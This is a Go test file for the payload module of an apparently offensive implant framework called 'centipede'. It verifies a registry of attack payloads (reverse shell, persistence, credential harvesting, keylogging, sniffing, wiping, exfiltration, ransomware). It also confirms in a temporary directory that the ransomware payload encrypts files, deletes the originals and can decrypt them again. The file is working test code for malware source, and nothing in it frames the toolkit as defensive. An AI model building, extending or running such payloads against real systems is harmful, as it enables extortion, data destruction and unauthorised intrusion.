package payloads

import (
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestRegistryComplete(t *testing.T) {
	want := []string{
		"reverse_shell", "persist", "harvest", "lateral", "pivot",
		"keylog", "sniff", "wipe", "enum", "exfil", "selfdestruct",
		"ransomware", "ransomware_decrypt",
	}
	for _, name := range want {
		if _, ok := Get(name); !ok {
			t.Errorf("payload %q not registered", name)
		}
	}
	if _, ok := Get("does-not-exist"); ok {
		t.Error("unknown payload reported as registered")
	}
	if _, err := Run("does-not-exist", nil); err == nil {
		t.Error("Run of unknown payload should error")
	}
}

func TestAESRoundTrip(t *testing.T) {
	key := make([]byte, 32)
	for i := range key {
		key[i] = byte(i)
	}
	msg := []byte("centipede encrypted channel round-trip")

	ct, err := aesEncrypt(msg, key)
	if err != nil {
		t.Fatalf("encrypt: %v", err)
	}
	if string(ct) == string(msg) {
		t.Fatal("ciphertext equals plaintext")
	}
	pt, err := aesDecrypt(ct, key)
	if err != nil {
		t.Fatalf("decrypt: %v", err)
	}
	if string(pt) != string(msg) {
		t.Fatalf("round-trip mismatch: %q", pt)
	}

	badKey := make([]byte, 32)
	badKey[0] = 0xff
	if _, err := aesDecrypt(ct, badKey); err == nil {
		t.Fatal("decrypt with wrong key should fail (GCM auth)")
	}
}

func TestRansomwareRoundTripTempDir(t *testing.T) {
	dir := t.TempDir()
	file := filepath.Join(dir, "secret.doc")
	if err := os.WriteFile(file, []byte("top secret"), 0o644); err != nil {
		t.Fatal(err)
	}

	key := "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"

	out, err := Run("ransomware", map[string]string{
		"key":  key,
		"dirs": dir,
	})
	if err != nil {
		t.Fatalf("ransomware: %v", err)
	}
	if !strings.Contains(out, "Files encrypted: 1") {
		t.Fatalf("unexpected output: %s", out)
	}
	if _, err := os.Stat(file); !os.IsNotExist(err) {
		t.Fatal("original file still present after encryption")
	}
	enc := file + ".centipede"
	if _, err := os.Stat(enc); err != nil {
		t.Fatalf("encrypted file missing: %v", err)
	}

	out, err = Run("ransomware_decrypt", map[string]string{
		"key":  key,
		"dirs": dir,
	})
	if err != nil {
		t.Fatalf("decrypt: %v", err)
	}
	if !strings.Contains(out, "Files decrypted: 1") {
		t.Fatalf("unexpected output: %s", out)
	}
	data, err := os.ReadFile(file)
	if err != nil {
		t.Fatalf("restored file missing: %v", err)
	}
	if string(data) != "top secret" {
		t.Fatalf("restored content mismatch: %q", data)
	}
}

func TestRansomwareKeyValidation(t *testing.T) {
	if _, err := Run("ransomware", map[string]string{"key": "zz"}); err == nil {
		t.Fatal("invalid hex key should error")
	}
	if _, err := Run("ransomware", map[string]string{"key": hex.EncodeToString(make([]byte, 16))}); err == nil {
		t.Fatal("short key should error")
	}
}

func TestEnumRuns(t *testing.T) {
	out, err := Run("enum", nil)
	if err != nil {
		t.Fatalf("enum: %v", err)
	}
	if !strings.Contains(out, "uname") {
		t.Fatalf("enum output missing command headers: %.200s", out)
	}
}
